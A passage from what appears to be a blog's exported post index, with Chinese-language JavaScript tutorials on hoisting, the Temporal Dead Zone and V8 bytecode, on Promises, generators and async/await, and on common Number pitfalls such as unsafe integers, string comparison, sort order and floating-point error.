scopeJS 引擎：global scope，我這裡有個對 foo 的 LHS 引用，你有看過它嗎？執行結果：有，所以成功找到 foo 並且賦值 這時候的 global scope： &#123; foo: \"inside bar\", a: 1, bar: function &#125; Line 5：var a &#x3D; 2JS 引擎：bar scope，我這裡有個對 a 的 LHS 引用，你有看過它嗎？執行結果：bar scope 說有，所以成功找到 a 並且賦值 此時的 bar scope： &#123; a: 2 &#125; Line 6：c &#x3D; 3JS 引擎：bar scope，我這裡有個對 c 的 LHS 引用，你有看過它嗎？執行結果：bar scope 說沒有，所以去問上一層的 global scopeJS 引擎：global scope，我這裡有個對 c 的 LHS 引用，你有看過它嗎？執行結果：沒有。 這時候有幾種結果，如果你是處在嚴格模式底下（use strict），會返回 ReferenceError: c is not defined 錯誤，如果你不是在嚴格模式，那 global scope 就會把 c 加上去並且設定成 3，這邊先假設我們不是在嚴格模式。 此時的 global scope： &#123; foo: \"inside bar\", a: 1, bar: function, c: 3 &#125; Line 7：console.log(c)JS 引擎：bar scope，我這裡有個對 c 的 RHS 引用，你有看過它嗎？執行結果：bar scope 說沒有，所以去問上一層的 global scopeJS 引擎：global scope，我這裡有個對 c 的 RHS 引用，你有看過它嗎？執行結果：global scope 說有，所以成功返回 c 的值並且呼叫 console.log Line 8：console.log(d)JS 引擎：bar scope，我這裡有個對 d 的 RHS 引用，你有看過它嗎？執行結果：bar scope 說沒有，所以去問上一層的 global scopeJS 引擎：global scope，我這裡有個對 d 的 RHS 引用，你有看過它嗎？執行結果：global scope 說沒有，所以返回錯誤 ReferenceError: d is not defined 以上就是 JS 引擎的運作流程，想更詳細了解的話可參考：You Don’t Know JS: Scope &amp; Closures、Chapter 4: Hoisting、Hoisting in JavaScript。 中場總結再次回顧一下我們開場放的那十個項目： 你知道什麼是 hoisting 你知道 hoisting 只會提升宣告而非賦值 你知道 function 宣告、function 的參數以及一般變數宣告同時出現時的提升優先順序 你知道 let 跟 const 沒有 hoisting 你知道第四點是錯的，其實有但只是表現形式不一樣 你知道有關第五點，有個概念叫做 TDZ（Temporal Dead Zone） 你看過 ES3 的規格書，知道裡面是怎麼描述的 你看過 ES6 的規格書，知道裡面是怎麼描述的 你知道 hoisting 背後的原理是什麼 你看過 V8 編譯出來的程式碼 我們用了許多篇幅把其中的七點都講完了，剩下的是： 你知道有關第六點，有個概念叫做 TDZ（Temporal Dead Zone） 你看過 ES6 的規格書，知道裡面是怎麼描述的 你看過 V8 編譯出來的程式碼 關於 ES6 的規格那點我不打算詳細講（而且我也還沒詳細看完），因為變化還滿多的但基本上原理不變，就是多了一些專有名詞而已，想知道的可以參考這篇經典好文：ECMA-262-5 in detail. Chapter 3.2. Lexical environments: ECMAScript implementation.。 上面我們已經講了很多東西，所有跟 hoisting 有關的運作機制全部都講完了，但我相信依然需要一點時間吸收，但我相信吸收完以後你會覺得神清氣爽，想說 hoisting 不過如此而已。 接著呢，我們就要進入到這篇文章最後的部分了，也就是 TDZ 以及 V8。 Temporal Dead Zone還記得我們說過 let 與 const 其實有 hoisting 嗎？並且舉了一個小範例來驗證這件事情。 let 與 const 確實有 hoisting，與 var 的差別在於提升之後，var 宣告的變數會被初始化為 undefined，而 let 與 const 的宣告不會被初始化為 undefined，而且如果你在「賦值之前」就存取它，就會拋出錯誤。 在「提升之後」以及「賦值之前」這段「期間」，如果你存取它就會拋出錯誤，而這段期間就稱做是 TDZ，它是一個為了解釋 let 與 const 的 hoisting 行為所提出的一個名詞。 我們用下面的程式碼當做例子： function test() &#123; var a = 1; // c 的 TDZ 開始 var b = 2; console.log(c) // 錯誤 if (a > 1) &#123; console.log(a) &#125; let c = 10 // c 的 TDZ 結束 &#125; test() 當你在第八行執行以前試圖存取 c 的話，就會拋出錯誤。要注意的是 TDZ 並不是一個空間上的概念，而是時間，例如說以下程式碼： function test() &#123; yo() // c 的 TDZ 開始 let c = 10 // c 的 TDZ 結束 function yo()&#123; console.log(c) &#125; &#125; test() 在你進入 test 這個 function 的時候，就已經是 c 的 TDZ 了，所以當你執行 yo 並且執行到console.log(c)時，都還在 TDZ 裡面，要一直等到let c = 10被執行 TDZ 才會結束。 所以並不是說我把console.log(c)放在let c = 10下面就沒問題了，而是在「執行順序」上要在後面。 或是你也可以拋開這些名詞，用一句話總結： let 與 const 也有 hoisting 但沒有初始化為 undefined，而且在賦值之前試圖取值會發生錯誤。 Byte code 閱讀初體驗上面既然談到了 JS 引擎，如果沒有談到 V8 那就有點可惜，在我研究 hoisting 的時候我一直很想知道一件事情：V8 編譯出來的程式碼到底長怎樣？ 感謝 Understanding V8’s Bytecode 這一篇精彩的文章，可以讓我們試著用 node.js 把程式碼編譯成 byte code 並且試圖解讀。 在看之前先來介紹什麼是 byte code，它就是一種介於高階語言與機器碼中間的語言，沒有高階語言好懂可是卻比機器碼好懂許多，而執行起來的效率也比較高。 下面這張圖就是文章裡面附的，很清楚地解釋了之間的關係： 接著我們用這一個簡單的 function 當作範例，來看編譯過後會長怎樣： function funcA() &#123; var a = 10 console.log(a) &#125; funcA() 雖然只有一個 function，但是用 node.js 跑還是會出現一大堆東西，所以我們把結果先放到檔案裡面：node --print-bytecode test.js &gt; byte_code.txt 編譯出來的結果長這樣： [generating bytecode for function: funcA] Parameter count 1 Frame size 24 76 E> 0xeefa4feb062 @ 0 : 91 StackCheck 93 S> 0xeefa4feb063 @ 1 : 03 0a LdaSmi [10] 0xeefa4feb065 @ 3 : 1e fb Star r0 100 S> 0xeefa4feb067 @ 5 : 0a 00 02 LdaGlobal [0], [2] 0xeefa4feb06a @ 8 : 1e f9 Star r2 108 E> 0xeefa4feb06c @ 10 : 20 f9 01 04 LdaNamedProperty r2, [1], [4] 0xeefa4feb070 @ 14 : 1e fa Star r1 108 E> 0xeefa4feb072 @ 16 : 4c fa f9 fb 00 CallProperty1 r1, r2, r0, [0] 0xeefa4feb077 @ 21 : 04 LdaUndefined 115 S> 0xeefa4feb078 @ 22 : 95 Return Constant pool (size = 2) Handler Table (size = 16) 我們把前面一些資訊清空並加上註解，好讓大家知道上面程式碼是什麼意思（我其實也沒有真的很懂，這方面資料好像滿少的，如果有錯請糾正）： StackCheck LdaSmi [10] // 把 10 放到 accumulator 裡面 Star r0 // 把 accumulator 的值放到 r0 裡，所以 r0 = 10 LdaGlobal [0], [2] // 載入一個 Global 的東西到 acc 裡 Star r2 // 把它存到 r2，根據後見之明，r2 應該就是 console LdaNamedProperty r2, [1], [4] // 載入一個 r2 的 Property（應該就是 log） Star r1 // 把它存到 r1，也就是 r1 = console.log CallProperty1 r1, r2, r0, [0] // console.log.call(console, 10) LdaUndefined // 把 undefined 放到 acc Return // return undefined 再來我們把順序顛倒，變成這樣： function funcA() &#123; console.log(a) var a = 10 &#125; funcA() 來看看輸出的 byte code 會變什麼樣子，看解釋之前你可以先對照一下上面的，看看差別在哪： StackCheck LdaGlobal [0], [2] // 載入一個 Global 的東西到 acc 裡 Star r2 // 把它存到 r2，根據後見之明，r2 應該就是 console LdaNamedProperty r2, [1], [4] // 載入一個 r2 的 Property（應該就是 log） Star r1 // 把它存到 r1，也就是 r1 = console.log CallProperty1 r1, r2, r0, [0] // console.log.call(console, undefined) LdaSmi [10] // 把 10 放到 accumulator 裡面 Star r0 // 把 accumulator 的值放到 r0 裡，所以 r0 = 10 LdaUndefined // 把 undefined 放到 acc Return // return undefined 其實只是順序調換了一下，在輸出的地方直接 log 了 r0，這邊我不確定的是 r0 原本就是 undefined，還是在其他地方被初始化成 undefined。 再來我們看看如果試圖印出一個未宣告的變數會發生什麼事： function funcA() &#123; console.log(b) var a = 10 &#125; funcA() 因為大部分程式碼都跟前面重複我就不再註解了： StackCheck LdaGlobal [0], [2] Star r2 LdaNamedProperty r2, [1], [4] Star r1 LdaGlobal [2], [6] // 試圖載入 b 的值，出錯 Star r3 CallProperty1 r1, r2, r3, [0] LdaSmi [10] Star r0 LdaUndefined Return 整段的重點只有LdaGlobal那行，看起來應該是去載入 b 的值，在執行的時候應該也就是這行出錯，因為在 global 裡面找不到 b。 看完了基本的之後，我們來看看 let 會編譯成什麼樣子： function funcA() &#123; console.log(a) let a = 10 &#125; funcA() 編譯後的結果： LdaTheHole // 把 hole 載入到 acc 去 Star r0 // r0 = hole StackCheck LdaGlobal [0], [2] Star r2 // r2 = console LdaNamedProperty r2, [1], [4] Star r1 // r1 = console.log Ldar r0 // 載入 r0 ThrowReferenceErrorIfHole [2] // 拋出錯誤 CallProperty1 r1, r2, r0, [0] // console.log.call(console, r0) LdaSmi [10] Star r0 LdaUndefined Return 你會看到多了一個神秘的東西叫做 hole，這個其實就是我們所說的 TDZ，所以才會有 ThrowReferenceErrorIfHole 那一行，就代表說在 TDZ 結束之前我們如果試圖去存取這個 hole 的值都會拋出錯誤。 至此，也解釋了 TDZ 實際上在編譯階段是如何運作的，就是透過 hole 這個特別的東西。 總結最近開始補齊自己對 JavaScript 的一些基礎知識，不補還好，一補下去發現自己懂的東西比自己想像中還少，我要先感謝兩篇文章：解读ECMAScript[1]——执行环境、作用域及闭包、JS 作用域，這兩篇是我的啟蒙導師，如果沒看到這兩篇，大概也不會有這篇文章的出現。 JavaScript 常考的幾個點大家都耳熟能詳：this、prototype、clousre 跟 hoisting，而這幾個看似不相關的東西，其實只要你能理解 JavaScript 背後的運作模型，都能夠多少串得起來，成為一個完整的理論。 我在文中也有提到，上面講述執行環境的那段過程，其實補充得更完整以後就可以拿來解釋 clousre，就會發現很多東西其實都能融會貫通。日後有機會的話我會把個變成一系列，一一擊破 JavaScript 裡面那些你以為很難但其實沒有的概念。 寫這篇以前我大概醞釀了一個月，不斷找資料以後消化並且轉化為自己的理解，也很感謝上面那篇 JS 作用域的作者以及 YDKJS 的作者耐心解惑。 最後，也希望這篇文章對你們有幫助，有任何錯誤都可以跟我反映，感謝。 參考資料： MDN: Hoisting ECMA-262-3 in detail. Chapter 2. Variable object. JS 作用域 JavaScript Optimization Patterns (Part 2) danbev&#x2F;learning-v8 Why is there a “temporal dead zone” in ES6? exploringjs: Variables and scoping # 由阮一峰老师的一条微博引发的 TDZ 思考 理解ES6中的暂时死区(TDZ) TEMPORAL DEAD ZONE (TDZ) DEMYSTIFIED MDN: let Grokking V8 closures for fun (and profit?) 解读ECMAScript[1]——执行环境、作用域及闭包","link":"/2018/11/10/javascript-hoisting-and-tdz/"},{"title":"[Javascript] Promise, generator, async與ES6","text":"在Javascript裡面，有一個超級重要的概念就是非同步，這也是剛入門的時候最容易搞混、忘記的觀念ES6原生支援了Promise，搭配Generator使用效果更佳，而ES7甚至支援了async的語法我覺得這算是一個演進的過程，讓程式架構越來越好、可讀性越來越高所以要講解這些新的東西，就先從最基本的callback開始吧 現在假設我們有三個api第一個是抓取文章列表的api [ &#123; \"title\": \"文章1\", \"id\": 1 &#125;, &#123; \"title\": \"文章2\", \"id\": 2 &#125;, &#123; \"title\": \"文章3\", \"id\": 3 &#125; ] 第二個是給文章id, 抓取文章內容的api &#123; \"authorId\": 5, \"content\": \"content\", \"timestamp\": \"2015-08-26\" &#125; 第三個是給作者id, 返回作者資訊的api &#123; \"email\": \"aszx87410@gmail.com\", \"name\": \"huli\", \"id\": 5 &#125; 現在想要達成的功能是：抓取最新的一篇文章的作者信箱流程就是：抓文章列表-&gt;抓文章資訊-&gt;抓作者實作成code就像這樣 getArticleList(function(articles)&#123; getArticle(articles[0].id, function(article)&#123; getAuthor(article.authorId, function(author)&#123; alert(author.email); &#125;) &#125;) &#125;) function getAuthor(id, callback)&#123; $.ajax(\"http://beta.json-generator.com/api/json/get/E105pDLh\",&#123; author: id &#125;).done(function(result)&#123; callback(result); &#125;) &#125; function getArticle(id, callback)&#123; $.ajax(\"http://beta.json-generator.com/api/json/get/EkI02vUn\",&#123; id: id &#125;).done(function(result)&#123; callback(result); &#125;) &#125; function getArticleList(callback)&#123; $.ajax( \"http://beta.json-generator.com/api/json/get/Ey8JqwIh\") .done(function(result)&#123; callback(result); &#125;); &#125; 或可參考線上範例：用callback實做 相信這樣子的code大家應該都不陌生，但是這樣會有一個缺點就是我們俗稱的callback hell，這樣一層一層一層的實在是有點醜那該怎麼辦呢？有種東西叫做Promise，就這樣出現了先來個實際範例再來講解吧！ getArticleList().then(function(articles)&#123; return getArticle(articles[0].id); &#125;).then(function(article)&#123; return getAuthor(article.authorId); &#125;).then(function(author)&#123; alert(author.email); &#125;); function getAuthor(id)&#123; return new Promise(function(resolve, reject)&#123; $.ajax(\"http://beta.json-generator.com/api/json/get/E105pDLh\",&#123; author: id &#125;).done(function(result)&#123; resolve(result); &#125;) &#125;); &#125; function getArticle(id)&#123; return new Promise(function(resolve, reject)&#123; $.ajax(\"http://beta.json-generator.com/api/json/get/EkI02vUn\",&#123; id: id &#125;).done(function(result)&#123; resolve(result); &#125;) &#125;); &#125; function getArticleList()&#123; return new Promise(function(resolve, reject)&#123; $.ajax( \"http://beta.json-generator.com/api/json/get/Ey8JqwIh\") .done(function(result)&#123; resolve(result); &#125;); &#125;); &#125; 線上範例：用Promise實做Promise是一個物件，有三種狀態，等待中（pending）、完成（resolve or fulfilled）跟失敗（reject）在上面的範例中，我們把那三個函數的callback function拿掉了，取而代之的是返回一個Promise物件原本應該是callback要出現的地方，變成了resolve這樣有什麼好處呢？看我們最上面呼叫這些函式的地方，原本的callback hell不見了，被我們壓平了如果看的不是很懂，就先從最基本的，呼叫一個Promise開始 getArticleList().then(function(articles)&#123; console.log(articles); &#125;); function getArticleList()&#123; return new Promise(function(resolve, reject)&#123; $.ajax( \"http://beta.json-generator.com/api/json/get/Ey8JqwIh\") .done(function(result)&#123; resolve(result); &#125;); &#125;); &#125; 你可以在Promise物件後面加上.then，就會是這個Promise跑完之後的結果假如在then裡面return另一個Promise物件，就可以不斷串接使用像是這樣 getArticleList().then(function(articles)&#123; return getArticle(articles[0].id); &#125;).then(function(article)&#123; return getAuthor(article); &#125;); 有了Promise的這個特性，就可以避免掉callback hell如果我們加上ES6的arrow function，甚至可以簡化成這樣 getArticleList() .then(articles => getArticle(articles[0].id)) .then(article => getAuthor(article.authorId)) .then(author => &#123; alert(author.email); &#125;); 線上範例 Promise+arrow function 單純運用Promise的範例就到這邊為止，其實到這邊語法已經滿簡單的了，而且有了arrow function以後，可讀性有變得比較好，但是看到一堆then總是覺得有點礙眼 那接下來還有什麼呢？ES6裡面多了一個Generator，如果不知道的話可參考我的上一篇文章[Javascript] ES6 Generator基礎接著就要利用Generator的特性，來寫出超級像同步但其實是非同步的程式碼 function* run()&#123; var articles = yield getArticleList(); var article = yield getArticle(articles[0].id); var author = yield getAuthor(article.authorId); alert(author.email); &#125; var gen = run(); gen.next().value.then(function(r1)&#123; gen.next(r1).value.then(function(r2)&#123; gen.next(r2).value.then(function(r3)&#123; gen.next(r3); console.log(\"done\"); &#125;) &#125;) &#125;); 完整版線上範例 Promise + Generator 仔細看run這個generator，利用yield的特性，會先執行右邊的程式碼，等待下一次的呼叫並且賦值給左邊所以我們可以在getArticleList()裡面的then事件呼叫gen.next(r1)，就會把回傳值丟給articles這個變數如果覺得這樣有點難懂，可以先換成只有一層的 function* run()&#123; var articles = yield getArticleList(); console.log(articles); &#125; var gen = run(); //第一次呼叫，會執行到getArticleList()，會回傳一個Promise gen.next().value.then(function(r1)&#123; //第一個Promise結束後，把r1丟回給generator，讓articles = getArticleList()的回傳值 gen.next(r1); console.log('done'); &#125;); 讓我們再回來看看上面那段程式碼的上半部 function* run()&#123; var articles = yield getArticleList(); var article = yield getArticle(articles[0].id); var author = yield getAuthor(article.authorId); alert(author.email); &#125; 有沒有覺得，跟同步的程式碼很像？只要把yield拿掉的話，根本就一模一樣對吧！這就是generator的精髓所在了：用很像同步的語法，但其實是非同步 那再來看看下半部 var gen = run(); gen.next().value.then(function(r1)&#123; gen.next(r1).value.then(function(r2)&#123; gen.next(r2).value.then(function(r3)&#123; gen.next(r3); console.log(\"done\"); &#125;) &#125;) &#125;); 很容易可以發現下半部的語法很固定，並且容易找出規律而且根本就是個遞迴所以可以用一個函式包住，處理更多general的case function* run()&#123; var articles = yield getArticleList(); var article = yield getArticle(articles[0].id); var author = yield getAuthor(article.authorId); alert(author.email); &#125; function runGenerator()&#123; var gen = run(); function go(result)&#123; if(result.done) return; result.value.then(function(r)&#123; go(gen.next(r)); &#125;); &#125; go(gen.next()); &#125; runGenerator(); 完整版線上範例 Promise + Generator + 遞迴tj做的co模組就是在做差不多的事情，只是做得更多了但原理跟我們上面寫的runGenerator很類似，就是把一個generator包起來寫一個自動執行器 最後，終於要講到標題上的最後一個東西了：async這是什麼？先來看code async function run()&#123; var articles &#x3D; await getArticleList(); var article &#x3D; await getArticle(articles[0].id); var author &#x3D; await getAuthor(article.authorId); alert(author.email); &#125; 完整版線上範例 async(沒辦法跑)(jsfiddle支援度沒那麼高，所以沒辦法跑這段code) 這段code跟之前的差別在於 function* gen()變成async function run() yield變成await就這兩個點而已然後你會發現，就這樣就結束了不必用其他模組，不必自己寫遞迴執行器這就是async的語法，其實就是把那些自動執行寫好而已，但是這樣的語法讓我們方便許多而其實這個語法是在ES7才有計畫引入的，QQ 好消息是，我們上面有關ES6的code都是通過babel這個library轉換成ES5的語法而他有個實驗性功能的地方，其中就有包含async而async是在stage 2，NOTE: Stage 2 and above are enabled by default.什麼參數都不用調整就自動幫你開啟了，真是可喜可賀 當初剛接觸ES6時，一下子接觸到一堆眼花撩亂的東西，每個再繼續深入下去都是一門學問而且我在之前都是純粹用callback（因為層級不多所以還好），偶爾用一下async（node的library，跟上面的不一樣）所以我覺得最好了解的方式，就是從最基礎的callback開始，慢慢進步到promise，再進步到generator，最後才是async才能懂得為什麼會有這些東西的出現 如果有哪些地方有講錯，還麻煩留個言或是寄信給我感謝 ref:ECMAScript 6 入门 异步操作JavaScript Promises拥抱Generator，告别异步回调深入浅出ES6（三）：生成器 Generators","link":"/2015/08/26/javascript-promise-generator-async-es6/"},{"title":"使用 JavaScript 的數字時的常見錯誤","text":"在 JavaScript 的幾個資料型別中，Number 是非常常用的一個，而且有些小地方需要特別注意，不然很容易寫出有 bug 的程式碼。 這篇會帶大家看一些案例，有些是假想的情境，也有些是我自己碰過的問題，在每個案例繼續往下講解之前，大家也可以試著把自己帶入情境，想想看自己知不知道問題的成因，又該如何避免。 案例一：從重複的 ID 開始談起在前公司工作的時候，同事負責的是一個類似論壇的系統，而每個留言都會有一個獨特的 ID，既然都說是 ID 了，就代表是不會重複的。可是有一天呢，同事卻發現 ID 重複了！打開 DevTools 看 response 的內容，ID 確實是重複了沒錯，於是就跑去跟後端確認，順便唸了一下怎麼後端有 bug，產生出了重複的 ID。 但是後端檢查過之後，卻說沒有這回事，ID 是不可能會重複的，況且他也檢查過了，是不是前端有問題？ 於是我同事再跑回去看了前端，發現了一個奇怪的現象。 當你在開發者工具中用「Response」分頁看時，ID 確實沒有重複： 可是，一旦切到了「Preview」的分頁，卻發現 ID 居然重複了： 為什麼會有這麼神奇的現象呢？難道又是 JavaScript 的什麼奇妙 bug 嗎？ 沒有，並不是。只是我同事對 JavaScript 的 Number 資料型別沒有這麼熟悉而已。 有範圍的數字在上一篇來數數 JavaScript 的所有資料型別中我們有提過，JavaScript 的數字是用 64 bit 來存，而且遵循的規格是 IEEE 754-2019。 既然是用 64 bit 來存，就代表可以表示的資料量是有限的，可是數字是無限的，所以理所當然地，64 bit 不可能儲存所有的數字，因此一定就會有可儲存的上限跟安全範圍。 在 JavaScript 中，你可以用 Number.MAX_SAFE_INTEGER 拿到正整數的安全範圍，這個值會是 2^53 - 1，也就是 9007199254740991，那這個安全又是什麼意思呢？ MDN 這一段講得不錯： Safe in this context refers to the ability to represent integers exactly and to correctly compare them. For example, Number.MAX_SAFE_INTEGER + 1 &#x3D;&#x3D;&#x3D; Number.MAX_SAFE_INTEGER + 2 will evaluate to true, which is mathematically incorrect. 安全指的是這個數字可以正確地被表示而且拿來比較。換句話說，如果超出這個安全範圍，就不保證這件事情了，看個例子會更清楚一點： console.log(9007199254740992 === 9007199254740993) // true console.log(Number('9007199254740993')) // 9007199254740992 看到這邊，你應該就知道我同事碰到的問題是為什麼了，這是因為後端傳來的 ID 太大的關係，在 Response 分頁中，只是呈現出最原始後端傳回來的資料，並沒有轉成 JavaScript 的物件；而在 Preview 的分頁中，JSON 格式的字串被轉成了 JavaScript 的物件，因此 ID 被轉成了 Number，超出了安全範圍，所以就有了誤差，就像是上面的範例一樣。 那這該怎麼解決呢？後端的 ID 應該要傳字串型別，前端在使用時也要記得不要轉成數字，都把 ID 當作字串來看待，就不會有這種轉成數字的誤差問題。 另外，上面提到的 Number.MAX_SAFE_INTEGER 指的是安全範圍，也就是說就算超出這個範圍，你還是可以儲存數字，只是不精準而已。那這些不精準的數字有沒有範圍呢？一樣也有，上限是 Number.MAX_VALUE： console.log(Number.MAX_VALUE) // 1.7976931348623157e+308 大概是 1.79 * 10^308，一個很大的數字，那超過這個範圍會怎樣呢？會變成正無限大：Infinity。 console.log(Number.MAX_VALUE + 1) // 1.7976931348623157e+308 console.log(Number.MAX_VALUE * 2) // Infinity 咦，我上面不是說比 Number.MAX_VALUE 還大的話就是無限大嗎？為什麼 +1 之後沒有變成 Infinity？這原因就跟上面講的一樣，超出了安全範圍之後會變得不精準，所以其實 +1 之後還是同一個數字，如果你好奇那到底要加多少才會變成 Infinity，無聊的我把它找出來了，似乎是這個數字： console.log(Number.MAX_VALUE + 9.9792015476735e+291) // 1.7976931348623157e+308 console.log(Number.MAX_VALUE + 9.9792015476736e+291) // Infinity 總之呢，未來碰到這種大數相關的計算時，要記得 Number 的範圍上限，如果超出了這個範圍，可以改用最新的 BigInt 資料型別來處理，就不會碰到這些問題。 案例二：最近點對前幾年為了讓學生練習程式的基本語法，我架了一個 LIOJ，上面有一些我自己出的題目。 其中有一題難度並不是特別高，甚至可以說是滿普通的，可是只有將近 25% 的答對率。 題目連結在這邊：LIOJ 1033 - 最近點對，有興趣的朋友們可以先去試試看，看是否能夠一次 AC（但要先熟悉一下 OJ 的輸出入模式）。 這題是這樣的，輸入因為是用讀檔案的方式，所以都會是字串，格式長這樣： 4 2 3 1 3 1 2 1 1 第一行的 4 代表有 4 組資料，後面每一行為一組，都是一個代表 (x, y) 的座標，而這題就是要你求出距離最近的兩個點。如果有兩組以上都最近，請輸出最先出現在資料的那組。 而輸出的時候請先輸出 x 比較小的那個點，若是 x 相同，請先輸出 y 比較小的那個點 以上面的測試資料為例，答案就會是： 1 3 2 3 這題看似沒什麼難度，到底大家是犯了什麼錯，才會解不開呢？ 我們先來看一個常見的解法： const input = `4 2 3 1 3 1 2 1 1` const lines = input.split('\\n') const dots = lines.slice(1).map(item => item.split(' ')) let min = Infinity let ans1, ans2 for(let i=0; i&lt;dots.length; i++) &#123; for(let j=i+1; j&lt;dots.length; j++) &#123; let dis = distance(dots[i][0], dots[i][1], dots[j][0], dots[j][1]) if (dis &lt; min) &#123; ans1 = dots[i] ans2 = dots[j] min = dis &#125; &#125; &#125; // 先輸出 x 比較小的點 if (ans1[0] > ans2[0]) &#123; console.log(ans2[0] + ' ' + ans2[1]) console.log(ans1[0] + ' ' + ans1[1]) &#125; else if (ans1[0] &lt; ans2[0])&#123; console.log(ans1[0] + ' ' + ans1[1]) console.log(ans2[0] + ' ' + ans2[1]) &#125; else &#123; // 兩個相等，輸出 y 較小的點 if (ans1[1] > ans2[1]) &#123; console.log(ans2[0] + ' ' + ans2[1]) console.log(ans1[0] + ' ' + ans1[1]) &#125; else &#123; console.log(ans1[0] + ' ' + ans1[1]) console.log(ans2[0] + ' ' + ans2[1]) &#125; &#125; function distance(x1, y1, x2, y2) &#123; return Math.sqrt( (x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2) ) &#125; 看起來其實沒有什麼問題，把每一組都拿去算距離，距離算完之後找最小值，並且按照題目的要求輸出結果，而題目給的測試資料也有通過了。 但你如果實際丟到 OJ 上，會發現拿了 WA，代表上面這段程式碼是錯的。錯在哪裡呢？並不是錯在算距離，而是錯在輸出： if (ans1[0] > ans2[0]) &#123; console.log(ans2[0] + ' ' + ans2[1]) console.log(ans1[0] + ' ' + ans1[1]) &#125; else if (ans1[0] &lt; ans2[0])&#123; console.log(ans1[0] + ' ' + ans1[1]) console.log(ans2[0] + ' ' + ans2[1]) &#125; else &#123; // 兩個相等，輸出 y 較小的點 if (ans1[1] > ans2[1]) &#123; console.log(ans2[0] + ' ' + ans2[1]) console.log(ans1[0] + ' ' + ans1[1]) &#125; else &#123; console.log(ans1[0] + ' ' + ans1[1]) console.log(ans2[0] + ' ' + ans2[1]) &#125; &#125; 假設最後找到的兩個點是 (11,12) 跟 (2,3)，根據題目的敘述，應該要先輸出 x 比較小的點，也就是 (2,3)，可是上面的程式碼卻會先輸出 (11,12)，這是為什麼呢？ 這是因為我們在讀取資料的過程中，並沒有把資料特別轉成數字，所以其實從頭到尾我們所認為的數字，都是字串型別。在計算距離時因為用的是減法（x1 - x2），所以 JavaScript 會自動轉型成數字之後相減。 可是比較的時候，依然會按照原始的資料型別，也就是字串來進行比較。而 JavaScript 對於字串的比較基本上是按照字典序的。簡單來說呢，你在查字典的時候，例如說你要查 cool，一定是先翻去 c 的頁面，然後開始找 co，再找 coo，這樣一個字一個字找，最後才會找到 cool。 而字典序的比較也是類似，是一個字一個字比的，所以當 JavaScript 在比較 &quot;11&quot; 跟 2 時，比對第一個字發現 &quot;2&quot; 比 &quot;1&quot; 大，於是結果就是 &quot;2&quot; &gt; &quot;11&quot;，跟數字的比較邏輯完全不一樣。 所以在做比較之前，請記得確認一下變數的資料型別，不同的型別會有不同的比較方式。以上面的程式碼為例，其實只要在讀取輸入時把字串都轉成數字就沒事了。 雖然我上面這樣寫，但有少數狀況下儘管你有注意到資料型別也沒有用，因為背後的運作跟你想的不一樣。 在 JavaScript 中，最有名的案例莫過於陣列的排序。 let arr = [2, 11, 3, 7, 42] arr.sort() console.log(arr) // ??? 上面的程式碼，我相信任誰看了都會覺得結果要嘛是 2,3,7,11,42，要嘛是反過來的 42,11,7,3,2，但結果出乎你的意料，很抱歉兩者都不是，答案是 11,2,3,42,7： let arr = [2, 11, 3, 7, 42] arr.sort() console.log(arr) // [11, 2, 3, 42, 7] 這是因為 Array.prototype.sort 預設的排序方式，會把陣列裡的元素都先轉成字串來排，我們來看一下規格（23.1.3.27.1 SortCompare, p658）： 所以如果你要排序數字，那一定要傳入參數 comparefn，自定義比較的方式，例如說這樣： let arr = [2, 11, 3, 7, 42] arr.sort((a, b) => a - b) console.log(arr) // [2, 3, 7, 11, 42] comparefn 的邏輯是這樣的，會傳入兩個陣列裡的元素 a 跟 b，如果 function 回傳負數，表示 a 排在 b 前面，如果回傳 0，表示 a、b 的順序都不會變，回傳正數則表示 b 排在 a 前面。 我自己則是用另外一種方式去記：「先假設傳入的 ab 原本在陣列的順序就是 ab，回傳正數代表兩個要交換，負數不換，0 代表兩個相等」 因此如果我現在有 2 跟 11 兩個數，我回傳 a - b 就是負數，就不會換，所以會由小排到大；回傳 b - a 就會是正數，兩個就會換，就變成由大排到小。 那為什麼當初 JavaScript 要如此設計呢？已經有人在推特上問過 Brendan Eich 了，連結在這：https://twitter.com/BrendanEich/status/930665293034283008 他的回覆是： You mean the default sort function? It’s modeled on Perl 4 sort. Presumption was JS would be used for perlish tasks &amp; strings were likelier in arrays than numbers. (I think that’s the Perl rationale, but not sure.) Picking a numeric sort function if the array contained only numbers required checking every element type. I had to pick a type! 我沒有看得很懂，但大意應該就是他在設計時參考了 Perl 4 的 sort，而且預設了 JS 會拿來做一些 Perl 相關的任務，以及陣列中字串應該會比數字更常出現。除此之外，如果要實作數字的排序，那還要先檢查陣列裡面的每個元素的資料型別才行。 總之呢，在使用 sort 時要注意這個狀況，在進行數字的比較時也要記得先確認資料型別，否則可能會寫出有 bug 的程式碼。 最後再提醒一個小地方，就是把數字轉字串的時候，結果可能會跟你想的有點不一樣。 console.log((12345678912345678).toString()) // 12345678912345678 console.log((1234567891234567812345).toString()) // 1.2345678912345677e+22 console.log((0.000001).toString()) // 0.000001 console.log((0.0000001).toString()) // 1e-7 當你在轉一些比較大或比較小的數字的時候，會轉成科學記號的表示方式，在規格裡面有落落長的轉換規則（6.1.6.1.20 Number::toString, p.83）： 案例三：浮點數精準度問題這個應該就不少人都知道了，就是經典的 0.1 + 0.2 !== 0.3： console.log(0.1 + 0.2 === 0.3) // false console.log(0.1 + 0.2) // 0.30000000000000004 如果你認為這是 JavaScript 獨有的問題，那你就錯了，這其實是許多程式語言共同的問題。而問題的根源其實跟我們開頭講的數字範圍問題差不多，儲存數字的空間是有限的，數字卻是無限的，因此沒有辦法精確地表達所有的數字。 而浮點數的問題還有一個，那就是會有無窮小數這種東西出現，例如說 1/3 = 0.3333....，在存成浮點數的時候，就會失去一些精度： console.log((1/3).toFixed(30)) // 0.333333333333333314829616256247 那實際上我們在寫程式的時候，到底該怎麼辦呢？ 如果你沒有要做真的很精確的那種運算，只是想避免這種 0.1 + 0.2 !== 0.3 這種誤差的話，通常我們會抓一個合理的誤差值，意思就是我們不管是否相等了，而是把誤差考慮進去，只要誤差值在一定範圍內，就算它們相等，以 JavaScript 為例，就有提供一個 Number.EPSILON： console.log(Math.abs(0.3 - (0.1 + 0.2))) // 5.551115123125783e-17 console.log(Math.abs(0.3 - (0.1 + 0.2)) &lt; Number.EPSILON) // true 不過 Number.EPSILON 的值是 2^-52，說實在的有點太小，如果你多做幾次浮點數的運算，其實很容易就會超過這個範圍： console.log(Math.abs(3.3 - (1.1 + 1.1 + 1.1))) // 4.440892098500626e-16 console.log(Math.abs(3.3 - (1.1 + 1.1 + 1.1)) &lt; Number.EPSILON) // false 